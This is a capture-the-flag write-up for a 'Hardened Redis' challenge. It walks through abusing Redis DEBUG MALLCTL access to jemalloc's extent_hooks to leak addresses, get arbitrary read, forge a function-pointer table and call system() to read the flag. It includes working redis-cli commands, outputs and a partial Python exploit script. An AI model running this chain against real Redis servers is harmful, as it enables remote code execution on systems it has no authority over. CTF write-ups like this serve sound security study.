# Hardened Redis&emsp;<sub><sup>Clone-and-Pwn, 276 points</sup></sub>

_Writeup by [@ath0](https://fastb.in)_

> My Redis Server is now invincible and unassailable. It has been fortified to the highest degree, making it impervious to any attempts to breach its security. No one will be able to penetrate the server's defenses, making it truly indomitable.

The [download for this problem](./Hardened_Redis_e0a549819e9aa8bbfee3b6dfd35050aa.tar.gz) contained a Dockerfile that installs the 'redis' package on Ubuntu 22.04, and runs it using the provided `redis.conf`. Skimming this configuration, you'll find it's pretty standard, but there's a few unusual options:

```
rename-command MODULE ""
rename-command CONFIG ""
rename-command SCRIPT ""
rename-command SAVE ""
```

It appears that they've renamed some commands to prevent us from using them. It is "hardened" after all. I didn't find a way that we could easily bypass the command rewriting logic, so we'll have to work with the remaining commands. After browsing the others, there's only a few that stand out:
- `EVAL` lets us execute (sandboxed) Lua
- `REPLICAOF` might let us connect this server to a cluster, which might have some interesting capabilities?
- `DEBUG` has a bunch of suspcious options

Looking at `DEBUG` a little closer, there's a few commands that stand out, but the only ones I could get to do anything useful were these:
```
MALLCTL <key> [<val>]
    Get or set a malloc tuning integer.
MALLCTL-STR <key> [<val>]
    Get or set a malloc tuning string.
```

This seems dangerous -- most allocators have lots of knobs you can turn to change stuff like which allocations go in what bins, etc -- maybe there's something in this allocator that will give us enough power to get arb read/write, (or better)?

Redis uses an allocator called 'jemalloc', and there is decent documentation on all of its `mallctl` options [here](https://jemalloc.net/jemalloc.3.html#mallctl_namespace).

Some options seemed particularly interesting (though we won't need all of them):

- `thread.arena` (unsigned) rw

    > Get or set the arena associated with the calling thread. If the specified arena was not initialized beforehand (see the arena.i.initialized mallctl), it will be automatically initialized as a side effect of calling this interface.

- `arena.<i>.extent_hooks` (extent_hooks_t *) rw

    > Get or set the extent management hook functions for arena The functions must be capable of operating on all extant extents associated with arena, usually by passing unknown extents to the replaced functions. In practice, it is feasible to control allocation for arenas explicitly created via arenas.create such that all extents originate from an application-supplied extent allocator (by specifying the custom extent hook functions during arena creation). However, the API guarantees for the automatically created arenas may be relaxed -- hooks set there may be called in a "best effort" fashion; in addition there may be extents created prior to the application having an opportunity to take over extent allocation.

- `arenas.create` (unsigned, extent_hooks_t *) rw
    > Explicitly create a new arena outside the range of automatically managed arenas, with optionally specified extent hooks, and return the new arena index.
    > If the amount of space supplied for storing the arena index does not equal sizeof(unsigned), no arena will be created, no data will be written to the space pointed by oldp, and *oldlenp will be set to 0.

- `arenas.lookup` (unsigned, void*) rw
    > Index of the arena to which an allocation belongs to.

- `thread.prof.name` (const char *) r- or -w [--enable-prof]
    > Get/set the descriptive name associated with the calling thread in memory profile dumps. An internal copy of the name string is created, so the input string need not be maintained after this interface completes execution. The output string of this interface should be copied for non-ephemeral uses, because multiple implementation details can cause asynchronous string deallocation. Furthermore, each invocation of this interface can only read or write; simultaneous read/write is not supported due to string lifetime limitations. The name string must be nil-terminated and comprised only of characters in the sets recognized by isgraph(3) and isblank(3).

- `arena.<i>.dss` (const char *) rw
    > Set the precedence of dss allocation as related to mmap allocation for arena, or for all arenas if equals MALLCTL_ARENAS_ALL. See opt.dss for supported settings.

If we play around with the two functions in `redis-cli`, we immediately get interesting results:

```
127.0.0.1:6379> DEBUG MALLCTL arena.0.extent_hooks
(integer) 140527789771264
```

Easy -- we have a leak. `0x7fcf2cfd8a00`, which was in `libjemalloc`.
```
7fcf2cfd7000-7fcf2cfdc000 r--p 000b0000 00:36 19270196                   /usr/lib/x86_64-linux-gnu/libjemalloc.so.2
```

Some of these fields are supposed to be strings, and you can print them out as such:
```
127.0.0.1:6379> DEBUG MALLCTL-STR arena.0.dss
"secondary"
127.0.0.1:6379> DEBUG MALLCTL-STR thread.prof.name
""
```

Of note, you can get (and set!) each of the string/pointer options as an integer or as a string! This is very convenient, since we can input a pointer value and then read that back as a string (giving us arbitrary read).

We can read from the .got table in jemalloc and get a libc leak! The got table is at 0x3810 from the previous leak, so let's try that out.

```
127.0.0.1:6379> DEBUG MALLCTL thread.prof.name 140527789721616
(error) ERR Bad address
```
Hmm... didn't work. If we consult the jemalloc source, we'll find the [function](https://github.com/jemalloc/jemalloc/blob/dev/src/ctl.c#L2375) that handles setting this ctl calls `prof_thread_name_set`, which leads [here](https://github.com/jemalloc/jemalloc/blob/a0734fd6ee326cd2059edbe4bca7092988a63684/src/prof_data.c#L486):

```
for (i = 0; thread_name[i] != '\0'; i++) {
    char c = thread_name[i];
    if (!isgraph(c) && !isblank(c)) {
        return EFAULT;
    }
}
```
Unforunately, they check the name to ensure the characters are printable. But surely we can find another ctl that doesn't do this check?

```
127.0.0.1:6379> DEBUG MALLCTL arenas.create
(integer) 34
127.0.0.1:6379> DEBUG MALLCTL arena.34.extent_hooks 140527789785616
(integer) 140527789721616
127.0.0.1:6379> DEBUG MALLCTL-STR arena.34.extent_hooks
"\xc0k\x93,\xcf\x7f"
```
Perfect, we create a new heap arena (to avoid screwing the real heap arenas up), and then overwrite this pointer with the address of a got table entry. Then, we read it back as a string and we get a libc pointer!

This is great, but we still don't have PC control. Luckily `extent_hooks` will help us there too. This ctl is expecting to point to an array of *function pointers*. 
```
typedef extent_hooks_s extent_hooks_t;
struct extent_hooks_s {
	extent_alloc_t		*alloc;
	extent_dalloc_t		*dalloc;
	extent_destroy_t	*destroy;
	extent_commit_t		*commit;
	extent_decommit_t	*decommit;
	extent_purge_t		*purge_lazy;
	extent_purge_t		*purge_forced;
	extent_split_t		*split;
	extent_merge_t		*merge;
};
```

We need a way to construct a fake table with our own collection of pointers. I used the `DEBUG LEAK` command.

```
DEBUG LEAK AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
Now we have a long screaming buffer at a known offset (well, it's mostly consistent) from our jemalloc leak. (You can check this out on your own in GEF/pwndbg.)

Putting together what we have so far:
1) Leak jemalloc pointer
2) Leak libc pointer by abusing integer/string confusion
3) Write fake `extent_hooks_t` table
4) Overwrite the `extent_hooks_t` table for arena 0.
5) ???

Through trial and error, I found out that the easiest of the two functions to trigger are `alloc` and `dealloc`, unsurprisingly. And `dealloc` appears to get called after disconnecting. The arguments to these functions are not controlled, except for the fact that RDI is pointing to the start of the table (ie. `arena.<num>.extent_hooks`).

This gives us the ability to call an arbitrary function with a controlled string as the first argument, with a maximum of 8 bytes (including null terminator). This will only work if we can avoid any calls to `alloc`, since that will have been clobbered by the string.

At first, I just put `/bin/sh\0` as the string, and was able to successfully get system called.

```
arena = run("DEBUG MALLCTL arenas.create")

# jemalloc leak
lib_leak = run(f"DEBUG MALLCTL arena.{arena}.extent_hooks")

# libc leak
mmap_leak_addr = lib_leak + 0x3810 # got (mmap) in jemalloc
libc_leak = arbitary_read(mmap_leak_addr)

# offset to system
system_addr = libc_leak + (0x50d60 - 0x11ebc0)
s = b"/bin/sh\0"
print(f"[+] system: {hex(system_addr)}")

# Make some allocations for our table of function pointers
# (really we only use one of these)
run(b"DEBUG LEAK 00000"+(s + p64(system_addr) + p64(0) * 7))
run(b"DEBUG LEAK 00000"+(s + p64(system_addr) + p64(0) * 7))
run(b"DEBUG LEAK 00000"+(s + p64(system_addr) + p64(0) * 7))
run(b"DEBUG LEAK 00000"+(s + p64(system_addr) + p64(0) * 7))

addr_of_fake_table = ... # offset from lib_leak, determined experimentally
run(f"DEBUG MALLCTL thread.arena {arena}")
run(f"DEBUG MALLCTL arena.{arena}.extent_hooks {addr_of_fake_table}")
```

From here, the exploit reliability was a little shaky. I played around with it, and found that it seems more reliable if I do some extra allocations and open some more connections immediately before overwriting `extent_hooks`. The idea is to increase the likelihood that `dealloc` gets called before `alloc`.

This got me a shell in the docker container! But we can't interact with it on remote, since remote does not provide the stdout/stderr of the `redis` process. We need to do better...

I was talking with @f0xtr0t and we had the idea to try writing directly to the fd that was being used for our `redis-cli` connection.

```
root@c62bf56792ad:/# ls -al /proc/1/fd/
total 0
dr-x------ 2 redis redis  0 Jan 14 06:52 .
dr-xr-xr-x 9 redis redis  0 Jan 14 06:52 ..
lrwx------ 1 redis redis 64 Jan 14 06:52 0 -> /dev/pts/0
lrwx------ 1 redis redis 64 Jan 14 06:52 1 -> /dev/pts/0
lrwx------ 1 redis redis 64 Jan 14 06:52 2 -> /dev/pts/0
lr-x------ 1 redis redis 64 Jan 14 06:52 3 -> 'pipe:[51313]'
l-wx------ 1 redis redis 64 Jan 14 06:52 4 -> 'pipe:[51313]'
lrwx------ 1 redis redis 64 Jan 14 06:52 5 -> 'anon_inode:[eventpoll]'
lrwx------ 1 redis redis 64 Jan 14 06:52 6 -> 'socket:[51317]'
lrwx------ 1 redis redis 64 Jan 14 07:35 7 -> 'socket:[50697]'
```
In the container, it looks like our socket is probably 6 or 7. Really we just want to read the flag, and we came up with `/r*>&7\0` (only 7 bytes!) and will call /readflag and forward us the output. I tried both 6 and 7, and 7 worked! The only slightly tricky part is getting the Python redis client's socket so you can call a raw recv() and get the flag when it is sent. But here's how I did that:

```
    while True:
        b = client.connection_pool.get_connection("name")._sock.recv(128)
        if len(b) != 0:
            print(b)
```

Put it all together (see `solve.py`) and you get the flag!

```
rwctf{Us3-0LD-Vuln3r4bility-Pwn-R3di5-!!!}
```
